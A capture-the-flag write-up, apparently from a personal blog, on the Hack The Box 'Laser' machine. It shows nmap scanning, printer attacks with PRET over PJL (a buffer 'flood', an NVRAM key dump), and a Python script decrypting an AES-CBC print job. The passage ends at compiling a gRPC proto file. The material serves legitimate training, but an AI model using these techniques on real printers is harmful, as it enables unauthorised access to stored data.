---
title: "Laser"
difficulty: Insane
os: Linux
points: 50
rating: 4.1
date: 2020-08-08
avatar: assets/htb/laser.png
tags: [Remote Code Execution, Server Side Request Forgery (SSRF), Information Disclosure, Misconfiguration, Race Condition, Weak Cryptography, Reconnaissance, Exploit Development]
htb_url: https://app.hackthebox.com/machines/Laser
---
## Overview

Reaching the foothold on this Insane box from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me longer than rooting most other machines! The attack paths here were unusual and a far cry from the typical enumerate-and-pivot flow that lower-difficulty boxes rely on. Just getting started meant learning protocols I hadn't touched before, and by the end I'd written five python scripts to drive the foothold and the later privilege escalation. Overall a fun but genuinely tough run!

## Useful Skills and Tools

#### Using socat to redirect traffic to a port

* The command below forwards anything arriving on the local machine's port 22 over to port 22 on the host at 172.17.0.1.  

  ```text
  socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
  ```

## Enumeration

### Nmap scan

I kicked off enumeration with an nmap scan against `<YOUR_IP>`. The flags I lean on are: `-p-`, a shorthand telling nmap to hit every port; `-sC`, which is the same as `--script=default` and fires nmap's default enumeration scripts at the target; `-sV` for a service scan; and `-oA <name>` to write the results out under the filename `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ nmap -sCV -n -v -p- -oA laser <YOUR_IP>                
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 15:31 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating Ping Scan at 15:31
Scanning <YOUR_IP> [2 ports]
Completed Ping Scan at 15:31, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 15:31
Scanning <YOUR_IP> [65535 ports]
Discovered open port 22/tcp on <YOUR_IP>
Discovered open port 9100/tcp on <YOUR_IP>
Discovered open port 9000/tcp on <YOUR_IP>
Completed Connect Scan at 15:31, 20.79s elapsed (65535 total ports)
Initiating Service scan at 15:31
Scanning 2 services on <YOUR_IP>
Completed Service scan at 15:31, 8.73s elapsed (3 services on 1 host)
NSE: Script scanning <YOUR_IP>.
Initiating NSE at 15:31
Completed NSE at 15:32, 14.21s elapsed
Initiating NSE at 15:32
Completed NSE at 15:32, 0.09s elapsed
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.038s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
9000/tcp open  cslistener?
9100/tcp open  jetdirect?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.91%I=7%D=11/21%Time=5FB97935%P=x86_64-pc-linux-gnu%r(N
SF:ULL,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\
SF:0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0")%r(GenericLines,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@
SF:\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0
SF:\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(GetRequest,3F,"\
SF:0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03
SF:\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0")%r(HTTPOptions,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05
SF:\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x
SF:01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(RTSPRequest,3F,"\0\0\x18\x
SF:04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x0
SF:1\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:")%r(RPCCheck,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x
SF:06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(DNSVersionBindReqTCP,3F,"\0\0\x18\x04\
SF:0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0
SF:\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%
SF:r(DNSStatusRequestTCP,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\
SF:0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0
SF:\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(Help,3F,"\0\0\x18\x04\0\0\0\0\
SF:0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x
SF:08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(SSLSes
SF:sionReq,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\
SF:x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0")%r(TerminalServerCookie,3F,"\0\0\x18\x04\0\0\0\
SF:0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04
SF:\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(TLSS
SF:essionReq,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\
SF:0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.32 seconds
```

The Nmap scan returned just three open ports: 22 - SSH, 9000, and 9001. Not recognizing the latter two, I looked up what typically uses ports 9000 and 9001, and learned they're often associated with printers.

### Port 9000 & 9001

![](assets/wu/laser/img-1.png)

My first move was to point a browser at these ports to see how they'd answer. 9001 gave nothing back at all, and 9000 returned only garbage characters \(likely binary data\).

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ telnet <YOUR_IP> 9100
Trying <YOUR_IP>...
Connected to <YOUR_IP>.
Escape character is '^]'.
test
?
print
?
exit
?
^C^C^C^C^]
telnet> quit
Connection closed.
```

Then I connected via telnet, but whatever I typed only came back as `?`.  I dug deeper into what vulnerabilities these two open ports might expose, and found plenty of material on attacking exposed printers.

* [http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
* [https://book.hacktricks.xyz/pentesting/9100-pjl](https://book.hacktricks.xyz/pentesting/9100-pjl)
* [http://hacking-printers.net/wiki/](http://hacking-printers.net/wiki/)

One reference noted that having access to both a printer and SNMP basically means the system is already yours.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ sudo nmap -sU -p161 --reason <YOUR_IP>
sudo: unable to resolve host kali: Name or service not known
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 16:24 EST
Nmap scan report for <YOUR_IP>
Host is up, received echo-reply ttl 63 (0.041s latency).

PORT    STATE  SERVICE REASON
161/udp closed snmp    port-unreach ttl 63

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

Sadly SNMP appeared to be disabled here \(or perhaps moved to a non-standard port?\), which would otherwise have offered a solid way in.

### Printer Exploitation Toolkit \(PRET\)

A little more searching turned up a handy toolkit built for attacking printers, the Printer Exploitation Toolkit \(PRET\).  

[https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)

```text
┌──(kac0㉿kali)-[~/htb/laser/PRET]
└─$ python pret.py -o laser.pret <YOUR_IP> ps                                                    1 ⨯
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              

     (ASCII art by                                                 
     Jan Foerster)                                                 

Connection to <YOUR_IP> established
Command execution failed (timed out)

Forcing reconnect. Connection closed.
Connection to <YOUR_IP> established

No feedback (Printer busy, non-ps or silent)
^CDevice:   
Forcing reconnect. Connection closed.
Connection to <YOUR_IP> established

<YOUR_IP>:/> test
Unknown command: 'test'
<YOUR_IP>:/> 

┌──(kac0㉿kali)-[~/htb/laser/PRET]
└─$ python pret.py -o laser.pret <YOUR_IP> pcl
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              

     (ASCII art by                                                 
     Jan Foerster)                                                 

Connection to <YOUR_IP> established
Device:   Unknown printer

Welcome to the pret shell. Type help or ? to list commands.
<YOUR_IP>:/> help

Available commands (type help <topic>):
=======================================
cat    debug   discover  exit  get   info  loop  open   put       site   
close  delete  edit      free  help  load  ls    print  selftest  timeout
```

Following the docs, I got it running quickly and landed a pret shell on the machine using the PS printer language. That only produced errors, so I swapped to the PCL language and retried.  This time the `help` command listed more options to explore.

```text
<YOUR_IP>:/> ls
Command execution failed (timed out)

Forcing reconnect. Connection closed.
Connection to <YOUR_IP> established

This is a virtual pclfs. Use 'put' to upload files.
```

Running `ls` returned an error telling me I could use `put` to upload files.  The remaining commands yielded nothing more.

> Due to its limited capabilities, PCL is hard to exploit from a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The PRET tool implements a virtual, PCL-based file system which uses macros to save file content and metadata in the printer's memory. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‘misuse of service’ depending on the corporate policy.

After reading up on the differences between the printer languages, I concluded this target probably didn't speak the binary language of vaporators...I mean PCL.

```text
┌──(kac0㉿kali)-[~/htb/laser/PRET]
└─$ python pret.py -o laser.pret <YOUR_IP> pjl
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              

     (ASCII art by                                                 
     Jan Foerster)                                                 

Connection to <YOUR_IP> established
Device:   LaserCorp LaserJet 4ML

Welcome to the pret shell. Type help or ? to list commands.
<YOUR_IP>:/> help

Available commands (type help <topic>):
=======================================
append  delete    edit    free  info    mkdir      printenv  set        unlock 
cat     destroy   env     fuzz  load    nvram      put       site       version
cd      df        exit    get   lock    offline    pwd       status   
chvol   disable   find    help  loop    open       reset     timeout  
close   discover  flood   hold  ls      pagecount  restart   touch    
debug   display   format  id    mirror  print      selftest  traversal

<YOUR_IP>:/>
```

Having exhausted the PCL commands with no results, I circled back and tried the third language, PJL, which gave me another shell whose `help` command exposed far more commands.

```text
<YOUR_IP>:/> ls
d        -   pjl
<YOUR_IP>:/> cd pjl
<YOUR_IP>:/pjl> ls
d        -   jobs
<YOUR_IP>:/pjl> cd jobs/
<YOUR_IP>:/pjl/jobs> ls
-   172199   queued
<YOUR_IP>:/pjl/jobs> cat queued
b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAH

...huge text wall snipped...

dgblOUDj6BOA+MLrAiC/chpVOipOMtlonY1lxELrGFvQKAO8RSMUZNovS5gkLUolUkX3X6OeCsYJRf20mrgSSQ'
```

This time I could browse the file structure.  Inside `/pjl/jobs` sat a file called `queued`. 

My first mistake was **`cat`**-ing the **`queued`** file. Avoid that unless you enjoy copying an enormous base64 string and rebuilding the file by hand. Use **`get`** instead...

```text
<YOUR_IP>:/pjl/jobs> get queued
172199 bytes received.
```

**Use `get`**.  It downloads the file cleanly to your local box.  When I opened it, though, it was still a wall of base64 text, so I attempted to decode it.

```text
┌──(kac0㉿kali)-[~/htb/laser/PRET]
└─$ echo queued | base64 -d > queued.decoded
base64: invalid input
```

After stripping the extra characters \(which seemed to mark it as a python byte string\) out of the file, I tried base64-decoding it again, but the encoding still looked invalid.  So I kept enumerating in hopes of finding something to push me forward.

```text
<YOUR_IP>:/pjl/jobs> df
VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
0:     1755136    1718272    <HT>     <HT>  READ-WRITE
```

It looked like I had read-write access to the local drive.  I started wondering whether I could write something malicious to the printer to run code...

```text
<YOUR_IP>:/pjl/jobs> id
LaserCorp LaserJet 4ML
<YOUR_IP>:/pjl/jobs> pagecount
Hardware page counter: PAGECOUNT=183933
<YOUR_IP>:/> flood
Receiving PJL variables. Found 29 variables.
Buffer size: 10000, Sending: @PJL SET COPIES=[buffer]
Buffer size: 10000, Sending: @PJL SET PAPER=[buffer]
Buffer size: 10000, Sending: @PJL SET ORIENTATION=[buffer]
Buffer size: 10000, Sending: @PJL SET FORMLINES=[buffer]
Buffer size: 10000, Sending: @PJL SET MANUALFEED=[buffer]
Buffer size: 10000, Sending: @PJL SET RET=[buffer]
Buffer size: 10000, Sending: @PJL SET PAGEPROTECT=[buffer]
Buffer size: 10000, Sending: @PJL SET RESOLUTION=[buffer]
Buffer size: 10000, Sending: @PJL SET PERSONALITY=[buffer]
Buffer size: 10000, Sending: @PJL SET TIMEOUT=[buffer]
Buffer size: 10000, Sending: @PJL SET MPTRAY=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY1=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY2=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY3=[buffer]
Buffer size: 10000, Sending: @PJL SET CLEARABLEWARNINGS=[buffer]
Buffer size: 10000, Sending: @PJL SET AUTOCONT=[buffer]
Buffer size: 10000, Sending: @PJL SET DENSITY=[buffer]
Buffer size: 10000, Sending: @PJL SET LOWTONER=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY1SIZE=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY2SIZE=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY3SIZE=[buffer]
Buffer size: 10000, Sending: @PJL SET INTRAY4SIZE=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:PCL FONTSOURCE=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:PCL FONTNUMBER=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:PCL PITCH=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:PCL PTSIZE=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:PCL SYMSET=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:POSTSCRIPT PRTPSERRS=[buffer]
Buffer size: 10000, Sending: @PJL SET LPARM:ENCRYPTION MODE=[buffer]
Buffer size: 10000, Sending: @PJL SET [buffer]
Buffer size: 10000, Sending: @PJL [buffer]
Buffer size: 10000, Sending: @PJL COMMENT [buffer]
Buffer size: 10000, Sending: @PJL ENTER LANGUAGE=[buffer]
Buffer size: 10000, Sending: @PJL JOB NAME="[buffer]"
Buffer size: 10000, Sending: @PJL EOJ NAME="[buffer]"
Buffer size: 10000, Sending: @PJL INFO [buffer]
Buffer size: 10000, Sending: @PJL ECHO [buffer]
Buffer size: 10000, Sending: @PJL INQUIRE [buffer]
Buffer size: 10000, Sending: @PJL DINQUIRE [buffer]
Buffer size: 10000, Sending: @PJL USTATUS [buffer]
Buffer size: 10000, Sending: @PJL RDYMSG DISPLAY="[buffer]"
Buffer size: 10000, Sending: @PJL FSQUERY NAME="[buffer]"
Buffer size: 10000, Sending: @PJL FSDIRLIST NAME="[buffer]"
Buffer size: 10000, Sending: @PJL FSINIT VOLUME="[buffer]"
Buffer size: 10000, Sending: @PJL FSMKDIR NAME="[buffer]"
Buffer size: 10000, Sending: @PJL FSUPLOAD NAME="[buffer]"
<YOUR_IP>:/> display
Message: test
Setting printer's display message to "test"
```

Most of the commands returned nothing of value.

```text
<YOUR_IP>:/> env
COPIES=1 [2 RANGE]
        1
        999
PAPER=LETTER [3 ENUMERATED]
        LETTER
        LEGAL
        A4
ORIENTATION=PORTRAIT [2 ENUMERATED]
        PORTRAIT
        LANDSCAPE
FORMLINES=60 [2 RANGE]
        5
        128
MANUALFEED=OFF [2 ENUMERATED]
        OFF
        ON
RET=MEDIUM [4 ENUMERATED]
        OFF
        LIGHT
        MEDIUM
        DARK
PAGEPROTECT=OFF [4 ENUMERATED]
        OFF
        LETTER
        LEGAL
        A4
RESOLUTION=600 [2 ENUMERATED]
        300
        600
PERSONALITY=AUTO [3 ENUMERATED]
        AUTO
        PCL
        POSTSCRIPT
TIMEOUT=15 [2 RANGE]
        5
        300
MPTRAY=CASSETTE [3 ENUMERATED]
        MANUAL
        CASSETTE
        FIRST
INTRAY1=UNLOCKED [2 ENUMERATED]
        UNLOCKED
        LOCKED
INTRAY2=UNLOCKED [2 ENUMERATED]
        UNLOCKED
        LOCKED
INTRAY3=UNLOCKED [2 ENUMERATED]
        UNLOCKED
        LOCKED
CLEARABLEWARNINGS=ON [2 ENUMERATED READONLY]
        JOB
        ON
AUTOCONT=OFF [2 ENUMERATED READONLY]
        OFF
        ON
DENSITY=3 [2 RANGE READONLY]
        1
        5
LOWTONER=ON [2 ENUMERATED READONLY]
        OFF
        ON
INTRAY1SIZE=LETTER [9 ENUMERATED READONLY]
        LETTER
        LEGAL
        A4
        EXECUTIVE
        COM10
        MONARCH
        C5
        DL
        B5
INTRAY2SIZE=LETTER [4 ENUMERATED READONLY]
        LETTER
        LEGAL
        A4
        EXECUTIVE
INTRAY3SIZE=LETTER [4 ENUMERATED READONLY]
        LETTER
        LEGAL
        A4
        EXECUTIVE
INTRAY4SIZE=COM10 [5 ENUMERATED READONLY]
        COM10
        MONARCH
        C5
        DL
        B5
LPARM:PCL FONTSOURCE=I [1 ENUMERATED]
        I
LPARM:PCL FONTNUMBER=0 [2 RANGE]
        0
        50
LPARM:PCL PITCH=10.00 [2 RANGE]
        0.44
        99.99
LPARM:PCL PTSIZE=12.00 [2 RANGE]
        4.00
        999.75
LPARM:PCL SYMSET=ROMAN8 [4 ENUMERATED]
        ROMAN8
        ISOL1
        ISOL2
        WIN30
LPARM:POSTSCRIPT PRTPSERRS=OFF [2 ENUMERATED]
        OFF
        ON
LPARM:ENCRYPTION MODE=AES [CBC]
```

The `env` command revealed the printer's environment variable values.  The line `LPARM:ENCRYPTION MODE=AES [CBC]` seemed like it could matter if I ran into encrypted passwords or similar.

```text
<YOUR_IP>:/> info
Show information:  info <category>
  info config      - Provides configuration information.
  info filesys     - Returns PJL file system information.
  info id          - Provides the printer model number.
  info memory      - Identifies amount of memory available.
  info pagecount   - Returns the number of pages printed.
  info status      - Provides the current printer status.
  info ustatus     - Lists the unsolicited status variables.
  info variables   - Lists printer's environment variables.
<YOUR_IP>:/> info config
IN TRAYS [3 ENUMERATED]
        INTRAY1 MP
        INTRAY2 PC
        INTRAY3 LC
ENVELOPE TRAY
OUT TRAYS [1 ENUMERATED]
        NORMAL FACEDOWN
PAPERS [9 ENUMERATED]
        LETTER
        LEGAL
        A4
        EXECUTIVE
        MONARCH
        COM10
        DL
        C5
        B5
LANGUAGES [2 ENUMERATED]
        PCL
        POSTSCRIPT
USTATUS [4 ENUMERATED]
        DEVICE
        JOB
        PAGE
        TIMED
FONT CARTRIDGE SLOTS [1 ENUMERATED]
        CARTRIDGE
MEMORY=2097152
DISPLAY LINES=1
DISPLAY CHARACTER SIZE=16
<YOUR_IP>:/> info config
IN TRAYS [3 ENUMERATED]
        INTRAY1 MP
        INTRAY2 PC
        INTRAY3 LC
ENVELOPE TRAY
OUT TRAYS [1 ENUMERATED]
        NORMAL FACEDOWN
PAPERS [9 ENUMERATED]
        LETTER
        LEGAL
        A4
        EXECUTIVE
        MONARCH
        COM10
        DL
        C5
        B5
LANGUAGES [2 ENUMERATED]
        PCL
        POSTSCRIPT
USTATUS [4 ENUMERATED]
        DEVICE
        JOB
        PAGE
        TIMED
FONT CARTRIDGE SLOTS [1 ENUMERATED]
        CARTRIDGE
MEMORY=2097152
DISPLAY LINES=1
DISPLAY CHARACTER SIZE=16
<YOUR_IP>:/> info filesys
VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
0:     1755136    1718272    <HT>     <HT>  READ-WRITE
<YOUR_IP>:/> info id
LaserCorp LaserJet 4ML
<YOUR_IP>:/> info memory
TOTAL=1494416
LARGEST=1494176
<YOUR_IP>:/> info status
CODE=10001
DISPLAY="LaserCorp supply in use"
ONLINE=TRUE
<YOUR_IP>:/> info ustatus
DEVICE=OFF [3 ENUMERATED]
        OFF
        ON
        VERBOSE
JOB=OFF [2 ENUMERATED]
        OFF
        ON
PAGE=OFF [2 ENUMERATED]
        OFF
        ON
TIMED=0 [2 RANGE]
        5
        300
```

The `info` command mostly echoed what the other commands already showed...so, nothing useful.

```text
<YOUR_IP>:/> mirror
Creating mirror of /
Traversing pjl/
Traversing pjl/jobs/
0:/pjl/jobs/queued -> /home/kac0/htb/laser/PRET/mirror/<YOUR_IP>/0/pjl/jobs/queued
172199 bytes received.
```

The `mirror` command was interesting, copying the print queue down to my local machine.  Still, nobody appeared to be submitting new jobs to the printer.

### Decoding the `queued` file

```text
<YOUR_IP>:/> nvram
NVRAM operations:  nvram <operation>
  nvram dump [all]         - Dump (all) NVRAM to local file.
  nvram read addr          - Read single byte from address.
  nvram write addr value   - Write single byte to address.
<YOUR_IP>:/> nvram dump
Writing copy to nvram/<YOUR_IP>
..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k...e....y.....13u94r6..643rv19u
```

The `nvram` command included a dump operation that handed me what appeared to be a possible encryption key. 

![](assets/wu/laser/img-2.png)

Unsure whether the output contained everything I needed, I fired up Wireshark and captured packets to see what other data was being dumped.

```text
DATA = 49
DATA = 51
DATA = 118
DATA = 117
DATA = 57
DATA = 52
DATA = 114
DATA = 54
DATA = 46
DATA = 46
DATA = 54
DATA = 52
DATA = 51
DATA = 114
DATA = 118
DATA = 49
DATA = 57
DATA = 117
```

The capture gave me the data points above, which looked to me like decimal-encoded characters.

![](assets/wu/laser/img-3.png)

Since the key was decimal-encoded, I ran it through CyberChef and recovered the key `13vu94r6643rv19u`. The console output from the `nvram` command somehow hadn't decoded it correctly. \(I'm also not certain what the `46` characters between the two halves were, but they weren't needed. Maybe a delimiter separating the two halves?\)

```text
<YOUR_IP>:/> selftest
<YOUR_IP>:/> traversal
Path traversal unset.
<YOUR_IP>:/> traversal
Path traversal unset.
<YOUR_IP>:/> unlock
Cannot unlock (locking not supported by device)
<YOUR_IP>:/> version
Not available.
?
?
```

Having run through nearly every command and turned up little of use, I returned to the `queued` file I'd downloaded. Now that I held a candidate encryption key and had spotted that the encryption was AES... which produces base64 material that won't decode cleanly...I figured I was onto something.  I researched what I'd need to decode the file assuming it was AES-CBC encrypted.

* [https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode](https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode)
* [https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)

```python
#!/usr/bin/env python3

import base64
from Crypto.Cipher import AES

with open("queued.stripped","r") as q64:
    #Need to base64 decode the original 'queued` file
    q = base64.b64decode(q64.read())
    #First 8 bytes are junk
    non_junk = q[8:]
    #The IV is the last 16 bytes appended
    iv = non_junk[:16]
    #The ciphertext is everything not junk and not IV
    ct = non_junk[16:]
    #create the cipher with the key
    cipher = AES.new('13vu94r6643rv19u', AES.MODE_CBC, iv)
    #decrypt the ct to plaintext
    pt = cipher.decrypt(ct)
    with open('q-out', 'wb') as out:
        out.write(pt)
```

I wrote a small python script to decode the `queued` file after stripping the extraneous characters, dumping the result to `q-out`.  It took a few attempts since there was no IV.  I'd read that the IV is sometimes just the final 16-byte chunk of the file, and that approach decoded it.  Because the file held an odd number of byte-chunks, I had to drop the extra bytes at the start to make it decode.

### The PDF document

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ file q-out                                                                                      2 ⨯
q-out: PDF document, version 1.4
```

The file from the print queue turned out to be a PDF document.

![](assets/wu/laser/img-4.png)

```text
Description
Used to parse the feeds from various sources (Printers, Network devices, Web servers and other
connected devices). These feeds can be used in checking load balancing, health status, tracing.
Usage
To streamline the process we are utilising the Protocol Buffers and gRPC framework.
The engine runs on 9000 port by default. All devices should submit the feeds in serialized format
such that data transmission is fast and accurate across network.
We defined a Print service which has a RPC method called Feed . This method takes Content
as input parameter and returns Data from the server.
The Content message definition specifies a field data and Data message definition specifies a
field feed .
On successful data transmission you should see a message....

return service_pb2.Data(feed='Pushing feeds')
...
Here is how a sample feed information looks like.
{
  "version": "v1.0",
  "title": "Printer Feed",
  "home_page_url": "http://printer.laserinternal.htb/",
  "feed_url": "http://printer.laserinternal.htb/feeds.json",
  "items": [
             {
               "id": "2",
               "content_text": "Queue jobs"
             },
             {
               "id": "1",
               "content_text": "Failed items"
             }
           ]
}
QA with Clients
Gabriel (Client) : What optimisation measures you've taken ?
Victor (Product Manager) : This is main aspect where we completely relied on gRPC
framework which has low latency, highly scalable and language independent.
John (Client) : What measures you take while processing the serialized feeds ?
Adam (Senior Developer) : Well, we placed controls on what gets unpickled. We don't use
builtins and any other modules.
Release Info
Currently we are working on v1.0 with basic feature which includes rendering feeds on
dashboard.
Bugs
1. Error handling in _InactiveRPCError
2. Connection timeout issues
3. Forking issues
4. Issue raised by clients in last updateTodo
1. Fork support to increase efficiency for more clients
2. Data delivery in more formats
3. Dashboard design and some data analytics
4. Merge staging core to feed engine
```

The PDF described how to talk to a print API over gRPC on port 9000. It also listed the hostname `printer.laserinternal.htb`, which I added to my `/etc/hosts` file. 

### The GRPC python client

With the protocol for talking to the server now known, I had to work out how it functioned and how to leverage it for further enumeration.

* [https://grpc.io/docs/languages/python/basics/](https://grpc.io/docs/languages/python/basics/)
* [https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)
* [https://developers.google.com/protocol-buffers/docs/overview](https://developers.google.com/protocol-buffers/docs/overview)
* [https://developers.google.com/protocol-buffers/docs/proto3](https://developers.google.com/protocol-buffers/docs/proto3)
* [https://developers.google.com/protocol-buffers/docs/style](https://developers.google.com/protocol-buffers/docs/style)

```text
service FooService {
  rpc GetSomething(FooRequest) returns (FooResponse);
}
```

> The first line of the file specifies that you're using proto3 syntax: if you don't do this the protocol buffer compiler will assume you are using proto2. This must be the first non-empty, non-comment line of the file.

The grpc and protocol buffers documentation included examples of communicating with this kind of service from Python.

* [https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) 
* [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)

```text
syntax = "proto3";

service Print {

    rpc Feed(Content) returns (Data) {}

}

message Content {

string data = 1;

}

message Data {

string feed = 1;

}
```

Combining that with the details from the PDF I'd recovered, I built the `.proto` file above to instruct the grpc client on how to speak to this specific service.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
```

